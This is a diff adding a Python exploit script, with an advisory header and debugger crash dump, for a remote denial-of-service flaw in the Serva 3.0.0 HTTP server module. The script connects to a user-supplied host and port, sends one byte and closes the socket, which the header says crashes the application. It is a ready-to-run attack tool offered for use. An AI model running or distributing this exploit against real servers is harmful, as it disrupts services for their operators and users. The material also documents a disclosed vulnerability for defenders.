@@ -1,0 +1,72 @@
+#!/usr/bin/env python
+#
+#
+# Serva 3.0.0 HTTP Server Module Remote Denial of Service Exploit
+#
+#
+# Vendor: Patrick Masotta
+# Product web page: http://www.vercot.com
+# Affected version: 3.0.0.1001 (Community, Pro, 32/64bit)
+#
+# Summary: Serva is a light (~3 MB), yet powerful Microsoft Windows application.
+# It was conceived mainly as an Automated PXE Server Solution Accelerator. It bundles
+# on a single exe all of the underlying server protocols and services required by the
+# most complex PXE network boot/install scenarios simultaneously delivering Windows and
+# non-Windows assets to BIOS and UEFI based targets.
+#
+# Desc: The vulnerability is caused by the HTML (httpd) module and how it handles TCP requests.
+# This can be exploited to cause a denial of service attack resulting in application crash.
+#
+# ----------------------------------------------------------------------------
+#
+# (c1c.4bc): C++ EH exception - code e06d7363 (first chance)
+# (c1c.4bc): C++ EH exception - code e06d7363 (!!! second chance !!!)
+# *** WARNING: Unable to verify checksum for C:\Users\lqwrm\Desktop\Serva_Community_32_v3.0.0\Serva32.exe
+# *** ERROR: Module load completed but symbols could not be loaded for C:\Users\lqwrm\Desktop\Serva_Community_32_v3.0.0\Serva32.exe
+# eax=03127510 ebx=03127670 ecx=00000003 edx=00000000 esi=03127670 edi=031276a0
+# eip=74a1c54f esp=03127510 ebp=03127560 iopl=0         nv up ei pl nz ac po nc
+# cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000212
+# KERNELBASE!RaiseException+0x58:
+# 74a1c54f c9              leave
+# 0:013> kb
+# # ChildEBP RetAddr  Args to Child              
+# 00 03127560 004abaaf e06d7363 00000001 00000003 KERNELBASE!RaiseException+0x58
+# WARNING: Stack unwind information not available. Following frames may be wrong.
+# 01 03127598 004cc909 031275b8 005e13e8 6ca23755 Serva32+0xabaaf
+# 02 03127608 004085d3 0211ecf8 03127670 ffffffff Serva32+0xcc909
+# 03 0312761c 004089a5 031276a0 fffffffd 00000004 Serva32+0x85d3
+# 04 0312764c 00408f01 03127670 fffffffd 00000004 Serva32+0x89a5
+# 05 03127698 00413b38 00000000 0040007a 00000000 Serva32+0x8f01
+# 06 031277d8 00000000 00000000 00000000 00000000 Serva32+0x13b38
+#
+# ----------------------------------------------------------------------------
+#
+# Tested on: Microsoft Windows 7 Professional SP1 (EN)
+#
+#
+# Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+#                             @zeroscience
+#
+#
+# Advisory ID: ZSL-2016-5378
+# Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2016-5378.php
+#
+#
+# 17.11.2016
+#
+
+import sys,socket
+
+if len(sys.argv) < 3:
+
+	print '\nUsage: ' + sys.argv[0] + ' <target> <port>\n'
+	print 'Example: ' + sys.argv[0] + ' 172.19.0.214 80\n'
+	sys.exit(0)
+ 
+host = sys.argv[1]
+port = int(sys.argv[2])
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+connect = s.connect((host, port))
+s.settimeout(251)
+s.send('z')
+s.close
